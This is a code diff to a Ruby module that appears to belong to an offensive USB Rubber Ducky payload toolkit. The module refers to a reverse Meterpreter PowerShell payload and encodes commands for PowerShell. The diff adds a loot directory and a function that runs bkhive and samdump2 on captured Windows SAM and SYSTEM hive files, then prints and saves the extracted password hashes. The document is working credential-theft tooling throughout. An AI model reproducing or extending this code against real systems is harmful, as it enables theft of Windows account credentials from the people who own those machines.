@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 require 'base64'
 require 'fileutils'
+require 'open3'
 module MainCommands
   def print_error(text)
     print "\e[31;1m[-]\e[0m #{text}"
@@ -26,6 +27,9 @@ module MainCommands
   end
   def language_dir
     duck_encode_file + '/resources/'
+  end
+  def loot_dir
+    file_root + '/loot/'
   end
   def reverse_meterpreter_file
     'powershell_reverse_ducky.txt'
@@ -53,6 +57,23 @@ module MainCommands
   end
   def temp_path
     'c:\\windows\\temp\\test.txt'
+  end
+  def print_hashes(x)
+    #cache_path, cache_status = Open3.capture2('which cachedump')
+    samdump_path, samdump_status = Open3.capture2('which samdump2')
+    bkhive_path, bkhive_status = Open3.capture2('which bkhive')
+    #print_error("Can't find cachedump!\n") if cache_status.to_s =~ /1/
+    print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /1/
+    print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /1/
+    #if cache_status.to_s =~ /0/ and samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
+    if samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
+      Open3.capture2("#{bkhive_path} #{loot_dir}sys#{x} #{loot_dir}sys_key.txt")
+      sam_dump = Open3.capture2("#{samdump_path} #{loot_dir}sam#{x} #{loot_dir}sys_key.txt")
+      puts sam_dump
+      File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
+    else
+      print_error("Can't dump hashes!\n")
+    end
   end
   def encode_command(command)
     Base64.encode64(command.encode('utf-16le')).delete("\r\n")
